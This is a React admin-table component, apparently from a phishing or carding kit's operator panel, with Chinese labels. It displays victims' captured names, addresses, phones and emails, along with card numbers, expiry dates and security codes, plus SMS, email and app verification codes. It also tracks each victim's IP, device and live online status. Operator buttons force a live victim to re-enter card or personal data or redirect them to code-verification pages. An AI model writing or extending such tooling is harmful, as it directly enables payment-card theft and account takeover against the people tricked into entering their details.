import type { ReactNode } from 'react';
import type { ActionTone, FlatRow, RecordRow, RouteTarget } from '../types';

type ActivityBadge = { label: string; cls: string };

type AdminRecordsTableProps = {
  rows: FlatRow[];
  totalRows: number;
  pageStart: number;
  expandAll: boolean;
  collapsedMain: Record<string, boolean>;
  showHistory: Record<string, boolean>;
  onToggleCollapse: (mainId: number) => void;
  onToggleHistory: (id: RecordRow['id']) => void;
  onCopyText: (text: string) => void;
  onOpenCardPreview: (r: RecordRow) => void;
  onRefill: (socketId: string) => void;
  onCheckoutRefill: (socketId: string, recordId: RecordRow['id']) => void;
  onRouteUser: (socketId: string, target: RouteTarget) => void;
  onRouteByFrontendJs: (socketId: string) => void;
  badgeForActivity: (r: RecordRow) => ActivityBadge;
  getHistoryRows: (mainId: number, excludeId: RecordRow['id']) => RecordRow[];
  formatStatus: (status?: string, page?: string) => string;
};

function safeText(v: unknown) {
  return (v ?? '').toString();
}

function formatVerifyMethod(value?: string) {
  const raw = safeText(value).trim();
  const v = raw.toLowerCase();
  if (!v) return '-';
  if (v.includes('phone') || v.includes('sms') || v.includes('mobile') || v.includes('telephone')) return '手机';
  if (v.includes('email') || v.includes('mail')) return '邮箱';
  return raw;
}

function isSubId(id: RecordRow['id']) {
  return id.toString().includes('.');
}

function MiniCopyBtn({ onClick, disabled, title }: { onClick: () => void; disabled: boolean; title: string }) {
  return (
    <button
      onClick={(e) => {
        e.stopPropagation();
        onClick();
      }}
      disabled={disabled}
      title={title}
      className={[
        'text-[10px] px-1.5 py-0.5 rounded-md border transition-all shrink-0',
        disabled
          ? 'bg-[#11161e] border-[#2d3642] text-[#6f7a88] cursor-not-allowed'
          : 'bg-[#1a222d] hover:bg-[#243243] border-[#304158] text-[#9fb0c5] shadow-[inset_0_1px_0_rgba(255,255,255,0.04)]',
      ].join(' ')}
    >
      复制
    </button>
  );
}

function ActionBtn({
  label,
  onClick,
  disabled,
  title,
  tone = 'neutral',
}: {
  label: string;
  onClick: () => void;
  disabled: boolean;
  title: string;
  tone?: ActionTone;
}) {
  return (
    <button
      disabled={disabled}
      onClick={onClick}
      title={title}
      className={[
        'h-7 px-2 rounded-md text-[11px] font-medium border transition-colors whitespace-nowrap',
        disabled
          ? 'bg-[#161b22] text-[#7d8590]/60 border-[#30363d] cursor-not-allowed'
          : tone === 'danger'
            ? 'bg-[#da3633] hover:bg-[#f85149] text-white border-[#f85149]/40'
            : tone === 'brand'
              ? 'bg-[#1f6feb]/20 hover:bg-[#1f6feb]/30 text-[#9ecbff] border-[#1f6feb]/45'
              : 'bg-[#21262d] hover:bg-[#30363d] text-[#d2dbe7] border-[#30363d]',
      ].join(' ')}
    >
      {label}
    </button>
  );
}

function InlineField({
  label,
  value,
  mono,
  copyTitle,
  onCopy,
  compact = false,
  extraActions,
}: {
  label: string;
  value?: string;
  mono?: boolean;
  copyTitle: string;
  onCopy: () => void;
  compact?: boolean;
  extraActions?: ReactNode;
}) {
  const text = safeText(value).trim();
  return (
    <div
      className={[
        'flex items-start justify-between gap-1.5 rounded-md border border-[#30363d] bg-[#161b22]',
        compact ? 'px-1.5 py-0.5' : 'px-2 py-1',
      ].join(' ')}
    >
      <div className={['min-w-0 break-words', compact ? 'leading-4' : 'leading-5'].join(' ')}>
        <span className="text-[#8b949e]">{label}：</span>
        <span className={mono ? 'font-mono text-[#c9d1d9]' : 'text-[#c9d1d9]'}>{text || '-'}</span>
      </div>
      <div className="flex items-center gap-1">
        <MiniCopyBtn title={copyTitle} disabled={!text} onClick={onCopy} />
        {extraActions}
      </div>
    </div>
  );
}

export function AdminRecordsTable({
  rows,
  totalRows,
  pageStart,
  expandAll,
  collapsedMain,
  showHistory,
  onToggleCollapse,
  onToggleHistory,
  onCopyText,
  onOpenCardPreview,
  onRefill,
  onCheckoutRefill,
  onRouteUser,
  onRouteByFrontendJs,
  badgeForActivity,
  getHistoryRows,
  formatStatus,
}: AdminRecordsTableProps) {
  return (
    <div className="overflow-auto max-h-[72vh] border border-[#30363d] rounded-2xl bg-[#0d1117] shadow-[0_12px_28px_rgba(0,0,0,0.2)]">
      <table className="min-w-[2200px] w-full text-xs">
        <thead className="bg-[#161b22] sticky top-0 border-b border-[#30363d] z-10">
          <tr className="text-[#9eb0c8]">
            <th className="px-3 py-2 text-left w-32">序号</th>
            <th className="px-2 py-2 text-left w-40">时间 / IP</th>
            <th className="px-3 py-2 text-left min-w-[420px]">资料</th>
            <th className="px-3 py-2 text-left min-w-[330px]">结账</th>
            <th className="px-3 py-2 text-left min-w-[280px]">验证页</th>
            <th className="px-3 py-2 text-center w-52">状态</th>
            <th className="px-3 py-2 text-center w-40">活跃度</th>
            <th className="px-3 py-2 text-center w-[300px]">操作</th>
          </tr>
        </thead>

        <tbody className="divide-y divide-[#21262d]">
          {totalRows === 0 ? (
            <tr>
              <td colSpan={8} className="py-12 text-center text-[#8b949e] text-sm">
                暂无匹配记录
              </td>
            </tr>
          ) : (
            rows.map(({ r, indent, mainId, subsCount }, rowIndex) => {
              const sub = isSubId(r.id);
              const canRefill = !!r.socketId && r.online !== false;
              const canRoute = !!r.socketId && r.online !== false;
              const refillDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可重填';
              const routeDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可跳转';
              const active = !!r.active;
              const act = badgeForActivity(r);
              const showHistoryRow = !!showHistory[r.id.toString()];

              const historyRows = !sub && subsCount > 0 ? getHistoryRows(mainId, r.id) : [];
              const snapshots = (Array.isArray(r.checkoutSnapshots) ? r.checkoutSnapshots : []).slice(-3).reverse();
              const globalRowIndex = pageStart + rowIndex;

              return (
                <tr
                  key={r.id}
                  className={[
                    'transition-colors hover:bg-[#21262d] align-top',
                    globalRowIndex % 2 === 0 ? 'bg-[#0d1117]' : 'bg-[#161b22]',
                    active ? 'bg-[#1f6feb]/10 ring-1 ring-inset ring-[#1f6feb]/25' : '',
                  ].join(' ')}
                >
                  <td className="px-3 py-2">
                    <div className="flex items-start gap-1.5">
                      {!indent && subsCount > 0 && (
                        <button
                          onClick={() => onToggleCollapse(mainId)}
                          className="w-6 h-6 rounded-md bg-[#1a222d] hover:bg-[#263445] border border-[#304158] text-[10px] shrink-0"
                          title="展开/折叠"
                        >
                          {collapsedMain[mainId.toString()] ?? !expandAll ? '+' : '-'}
                        </button>
                      )}

                      <div className={indent ? 'pl-4' : ''}>
                        <div className="font-mono font-bold text-[#7eb7ff] text-base leading-5 tracking-wide">{r.id}</div>
                        <div className="mt-0.5 flex flex-wrap gap-1">
                          <span
                            className={
                              r.online === false
                                ? 'text-[10px] px-1.5 py-0.5 rounded-md bg-red-500/12 text-red-300 border border-red-500/30'
                                : 'text-[10px] px-1.5 py-0.5 rounded-md bg-green-500/12 text-green-300 border border-green-500/28'
                            }
                          >
                            {r.online === false ? '离线' : '在线'}
                          </span>
                          {active && <span className="text-[10px] px-1.5 py-0.5 rounded-md bg-[#3b82f6]/18 text-[#9bc7ff] border border-[#3b82f6]/38">当前</span>}
                          {sub && <span className="text-[10px] px-1.5 py-0.5 rounded-md bg-orange-500/12 text-orange-200 border border-orange-500/30">子记录</span>}
                          {(historyRows.length > 0 || snapshots.length > 0) && (
                            <button
                              onClick={() => onToggleHistory(r.id)}
                              className="text-[10px] px-1.5 py-0.5 rounded-md bg-[#1a222d] hover:bg-[#263445] border border-[#304158] text-[#9fb0c5]"
                            >
                              {showHistoryRow ? '收起历史' : '展开历史'}
                            </button>
                          )}
                        </div>
                      </div>
                    </div>
                  </td>

                  <td className="px-2 py-2">
                    <div className="space-y-0.5 min-w-0">
                      <div className="font-mono text-[11px] text-[#d2dbe7] leading-4 truncate" title={r.time || '-'}>
                        {r.time || '-'}
                      </div>
                      <div className="font-mono text-[11px] text-[#9fb0c5] leading-4 truncate" title={r.ip || '-'}>
                        {r.ip || '-'}
                      </div>
                      <div className="text-[10px] text-[#8b949e] leading-4 truncate" title={`设备：${safeText(r.deviceType) || '-'} / ${safeText(r.deviceOS) || '-'}`}>
                        设备：{safeText(r.deviceType) || '-'} / {safeText(r.deviceOS) || '-'}
                      </div>
                    </div>
                  </td>

                  <td className="px-3 py-2">
                    <div
                      style={{
                        display: 'grid',
                        gridTemplateColumns: 'minmax(0, 1fr) minmax(0, 1fr)',
                        columnGap: '8px',
                      }}
                    >
                      <div className="min-w-0" style={{ display: 'grid', rowGap: '4px' }}>
                        <InlineField compact label="姓名" value={r.fullname} copyTitle="复制姓名" onCopy={() => onCopyText(safeText(r.fullname))} />
                        <InlineField compact label="地址" value={r.address} copyTitle="复制地址" onCopy={() => onCopyText(safeText(r.address))} />
                        <InlineField compact label="完整地址" value={r.fulladdress} copyTitle="复制完整地址" onCopy={() => onCopyText(safeText(r.fulladdress))} />
                        <InlineField compact label="城市" value={r.city} copyTitle="复制城市" onCopy={() => onCopyText(safeText(r.city))} />
                      </div>
                      <div className="min-w-0" style={{ display: 'grid', rowGap: '4px' }}>
                        <InlineField compact label="州/省" value={r.state} copyTitle="复制州/省" onCopy={() => onCopyText(safeText(r.state))} />
                        <InlineField compact label="邮编" value={r.postalcode} mono copyTitle="复制邮编" onCopy={() => onCopyText(safeText(r.postalcode))} />
                        <InlineField compact label="电话" value={r.telephone} mono copyTitle="复制电话" onCopy={() => onCopyText(safeText(r.telephone))} />
                        <InlineField compact label="邮箱" value={r.email} mono copyTitle="复制邮箱" onCopy={() => onCopyText(safeText(r.email))} />
                      </div>
                    </div>

                    {showHistoryRow && historyRows.length > 0 && (
                      <div className="mt-1.5 rounded-md border border-[#2b3542] bg-[#0f151e]/70 p-1.5 space-y-1">
                        <div className="text-[10px] text-[#8ea2bc]">资料历史（最近3条）</div>
                        {historyRows.map((h) => (
                          <div key={`his-${r.id}-${h.id}`} className="text-[11px] text-[#9fb0c5] leading-5 break-words rounded-sm bg-[#0c121b] border border-[#243244] px-1.5 py-1">
                            <span className="font-mono text-[#8abfff]">{h.id}</span> · {safeText(h.fullname) || '-'} · {safeText(h.address) || '-'}
                          </div>
                        ))}
                      </div>
                    )}
                  </td>

                  <td className="px-3 py-2 space-y-1">
                    <InlineField label="姓名" value={r.checkoutName} copyTitle="复制结账姓名" onCopy={() => onCopyText(safeText(r.checkoutName))} />
                    <InlineField
                      label="号码"
                      value={r.checkoutPhone}
                      mono
                      copyTitle="复制结账号码"
                      onCopy={() => onCopyText(safeText(r.checkoutPhone))}
                      extraActions={
                        <button
                          onClick={() => onOpenCardPreview(r)}
                          className="h-5 px-1.5 rounded-md text-[10px] font-medium border transition-colors bg-[#1f6feb]/20 hover:bg-[#1f6feb]/30 text-[#9ecbff] border-[#1f6feb]/45"
                          title="显示号码卡片"
                        >
                          显示卡片
                        </button>
                      }
                    />
                    <InlineField label="日期" value={r.checkoutExpiryDate || r.checkoutDate} mono copyTitle="复制结账日期" onCopy={() => onCopyText(safeText(r.checkoutExpiryDate || r.checkoutDate))} />
                    <InlineField label="验证码" value={r.checkoutCode} mono copyTitle="复制结账验证码" onCopy={() => onCopyText(safeText(r.checkoutCode))} />

                    {showHistoryRow && snapshots.length > 0 && (
                      <div className="mt-1.5 rounded-md border border-[#2b3542] bg-[#0f151e]/70 p-1.5 space-y-1">
                        <div className="text-[10px] text-[#8ea2bc]">结账历史（最近3条）</div>
                        {snapshots.map((s, idx) => (
                          <div key={`snap-${r.id}-${idx}`} className="text-[11px] text-[#9fb0c5] leading-5 break-words rounded-sm bg-[#0c121b] border border-[#243244] px-1.5 py-1">
                            <span className="font-mono text-[#8abfff]">{s.time || `第${idx + 1}条`}</span> · {safeText(s.checkoutName) || '-'} · {safeText(s.checkoutPhone) || '-'} · {safeText(s.checkoutCode) || '-'}
                          </div>
                        ))}
                      </div>
                    )}
                  </td>

                  <td className="px-3 py-2 space-y-1">
                    <InlineField label="验证方式" value={formatVerifyMethod(r.verifyMethod)} copyTitle="复制验证方式" onCopy={() => onCopyText(formatVerifyMethod(r.verifyMethod))} />
                    <InlineField label="验证" value={r.verify} mono copyTitle="复制验证" onCopy={() => onCopyText(safeText(r.verify))} />
                    <InlineField label="邮箱验证" value={r.emailVerify} mono copyTitle="复制邮箱验证" onCopy={() => onCopyText(safeText(r.emailVerify))} />
                    <InlineField label="应用验证" value={r.appCheck} mono copyTitle="复制应用验证" onCopy={() => onCopyText(safeText(r.appCheck))} />
                  </td>

                  <td className="px-3 py-2 text-center">
                    <span className="inline-flex items-center justify-center bg-[#1a222d] text-[#d4ddeb] px-2.5 py-1 rounded-xl text-[11px] font-medium border border-[#304158] whitespace-nowrap max-w-[200px] shadow-[inset_0_1px_0_rgba(255,255,255,0.05)]">
                      <span className="truncate">{formatStatus(r.status, r.page)}</span>
                    </span>
                  </td>

                  <td className="px-3 py-2 text-center">
                    <span className={['inline-flex items-center justify-center px-2 py-1 rounded-xl text-[11px] font-medium border whitespace-nowrap', act.cls].join(' ')}>
                      {act.label}
                    </span>
                  </td>

                  <td className="px-3 py-2">
                    <div className="mx-auto w-[280px] rounded-xl border border-[#30363d] bg-[#161b22] p-2">
                      <div className="text-[10px] text-[#9fb0c5] mb-1 tracking-wide">重填</div>
                      <div className="grid grid-cols-2 gap-1.5">
                        <ActionBtn
                          label="重填资料"
                          tone="danger"
                          disabled={!canRefill}
                          onClick={() => canRefill && onRefill(r.socketId)}
                          title={!canRefill ? refillDisabledReason : '强制重填资料表单'}
                        />
                        <ActionBtn
                          label="重填结账"
                          tone="brand"
                          disabled={!canRefill}
                          onClick={() => canRefill && onCheckoutRefill(r.socketId, r.id)}
                          title={!canRefill ? refillDisabledReason : '在当前序号下重填结账'}
                        />
                      </div>
                      {!canRefill && <div className="mt-1 text-[10px] text-[#9aa7b8]">{refillDisabledReason}</div>}

                      <div className="mt-2 pt-2 border-t border-[#304158]">
                        <div className="text-[10px] text-[#9fb0c5] mb-1 tracking-wide">跳转</div>
                        <div className="grid grid-cols-1 gap-1.5">
                          <ActionBtn
                            label="进行验证"
                            disabled={!canRoute}
                            onClick={() => canRoute && onRouteUser(r.socketId, 'verify')}
                            title={!canRoute ? routeDisabledReason : '进入验证页面'}
                          />
                        </div>
                        <div className="mt-1 grid grid-cols-2 gap-1.5">
                          <ActionBtn
                            label="手机"
                            disabled={!canRoute}
                            onClick={() => canRoute && onRouteUser(r.socketId, 'verifyphone')}
                            title={!canRoute ? routeDisabledReason : '重新进入手机验证入口'}
                          />
                          <ActionBtn
                            label="邮箱"
                            disabled={!canRoute}
                            onClick={() => canRoute && onRouteUser(r.socketId, 'emailverify')}
                            title={!canRoute ? routeDisabledReason : '重新进入邮箱验证入口'}
                          />
                        </div>
                        <div className="mt-1.5">
                          <ActionBtn
                            label="前端跳转"
                            tone="brand"
                            disabled={!canRoute}
                            onClick={() => canRoute && onRouteByFrontendJs(r.socketId)}
                            title={!canRoute ? routeDisabledReason : '跳转目标由前端JS决定'}
                          />
                        </div>
                        {!canRoute && <div className="mt-1 text-[10px] text-[#9aa7b8]">{routeDisabledReason}</div>}
                      </div>
                    </div>
                  </td>
                </tr>
              );
            })
          )}
        </tbody>
      </table>
    </div>
  );
}
